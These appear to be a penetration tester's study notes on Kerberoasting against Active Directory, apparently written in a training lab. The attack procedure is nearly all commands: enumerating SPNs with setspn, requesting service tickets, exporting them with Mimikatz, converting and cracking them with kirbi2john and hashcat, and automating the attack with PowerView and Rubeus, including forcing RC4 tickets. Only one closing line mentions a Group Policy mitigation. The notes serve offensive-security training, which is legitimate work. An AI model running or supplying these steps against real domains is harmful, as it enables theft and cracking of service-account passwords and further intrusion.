# Semi-Manual Method
## Enumerating SPNs with setspn.exe
```JavaScript
setspn.exe -Q */*
```
![image 359.png](/image%20359.png)
  
## Targeting a Single User
```JavaScript
Add-Type -AssemblyName System.IdentityModel
System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>/<prefix>.<DOMAIN>:<port>"
```
- SPN, prefix, and port can be found in the setspn.exe output
    
    - for example: “MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433”
    
![image 1 267.png](/image%201%20267.png)
  
## Retrieving All Tickets Using setspn.exe
Not optimal because it pulls all computer accounts, but it is an option
```JavaScript
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
![image 2 226.png](/image%202%20226.png)
  
# Extracting Tickets From Memory Using Mimikatz
in mimikatz console:
```JavaScript
base64 /out:true
kerberos::list /export
```
![image 3 196.png](/image%203%20196.png)
- need to specify base64 as otherwise the hash will be extracted in .kirbi files
    
    - this makes it easier to bring it back to our host for cracking
    
  
## Preparing Base64 Blob for Cracking
you can skip these steps if you are able to just download the .kirbi file from the target machine
```JavaScript
echo "<base64 blob>" | tr -d \\n
```
![image 4 172.png](/image%204%20172.png)
  
Convert it back to .kirbi file using base64 utility
```JavaScript
cat <encoded_file> | base64 -d > <filename>.kirbi
```
  
## Cracking the Hash
Next, use kirbi2john
```JavaScript
kirbi2john <filename>.kirbi
```
- this will create a file called “crack_file”
  
then we modify the file a bit to use hashcat
```JavaScript
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <output_file>
```
- next, check and confirm that it looks like a valid hash
  
Crack with hashcat
```JavaScript
hashcat -m 13100 <hash> /path/to/wordlist
```
  
  
# Automated / Tool Based Route
## Using PowerView
```JavaScript
Import-Module ./PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
![image 5 161.png](/image%205%20161.png)
  
Target a specific user
```JavaScript
Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
```
![image 6 140.png](/image%206%20140.png)
  
## Export Tickets to CSV File
```JavaScript
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
  
View contents of CSV
```JavaScript
cat ./<file>.csv
```
![image 7 131.png](/image%207%20131.png)
  
## Using Rubeus
Get stats for SPN accounts
```JavaScript
./Rubeus.exe kerberoast /stats
```
![image 8 115.png](/image%208%20115.png)
- there are 9 kerberoastable accounts, 2 of which support AES encryption
- all 9 passwords were set in the last year
  
## LDAP Filtering with Rubeus
can see what kerberoastable users have administrator privileges
```JavaScript
./Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
![image 9 106.png](/image%209%20106.png)
  
  
# Checking Encryption Type
can use powershell to see if a user is using RC4 (the one worth cracking)
```JavaScript
Get-DomainUser <user> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
![image 10 90.png](/image%2010%2090.png)
- if “msds-supportedencryptiontypes” is set to 0, it uses default (RC4) and is worth cracking
    
    - if we see 24, it means that AES 128/256 are the only types supported
    
    ![image 11 82.png](/image%2011%2082.png)
    
  
  
# Cracking with Hashcat
```JavaScript
hashcat -m 13100 rc4_to_crack /path/to/wordlist
```
  
In the event that we do want to crack it, we need to use mode 19700
```JavaScript
hashcat -m 19700 aes_to_crack /path/to/wordlist
```
  
## Using the /tgtdeleg Flag
Can specify that we want to get RC4 hashes, even if the user is using AES
```JavaScript
./Rubeus.exe kerberoast /tgtdeleg /nowrap
./Rubeus.exe kerberoast /tgtdeleg /user:<user> /nowrap
```
![image 12 70.png](/image%2012%2070.png)
- this does not work against Windows Server 2019
  
It is possible to modify encryption types used by Kerberos
- Group Policy → edit Default Domain Policy → Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → double-click “Network security: Configure encryption types allowed for Kerberos” → select desired encryption types
![image 13 70.png](/image%2013%2070.png)